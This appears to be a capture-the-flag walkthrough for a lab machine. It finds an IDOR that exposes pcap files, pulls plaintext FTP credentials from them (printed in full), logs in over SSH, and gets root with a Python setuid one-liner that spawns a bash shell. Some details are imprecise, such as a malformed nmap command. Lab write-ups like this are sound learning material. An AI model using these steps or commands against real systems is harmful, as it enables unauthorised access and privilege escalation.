
Step 1: Nmap

```
Command: nmap -A --top-port 10.129.243.226 10000 --min-rate 1000
```

```
Output:

SSH
FTP
HTTP

```


Step 2: Look for vulnerable

```
I see url has the endpoint: /data/1, and I decide to change from 1 to 0, it also work, so it is a IDOR vulnerability, and in each 1 and 0 has a pcap file, so I download both file and filter the traffic inside the wireshark, after looking for a while, I intercept FTP of pcap file(0) and found the username and password as a plaintext
```

```
Username: nathan, Password: Buck3tH4TF0RM3!
```

Step 3: Gain access to user shell

```
It has two way to get user.txt, first is ftp and second is ssh, so I decide to ssh because it has stable shell and for privilege escalation to root also.
```

```
And here is the user flag:

Command: cat user.txt
Output: [user flag removed]
```

Step 4: Privilege Escalation to Root Access

```
python3 --version

Output: Python 3.8.5
```

```
Search in google and found the vulnerabilities:

And here is the PoC to get root shell:

Command: /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

And here is the root flag: [root flag removed]
```

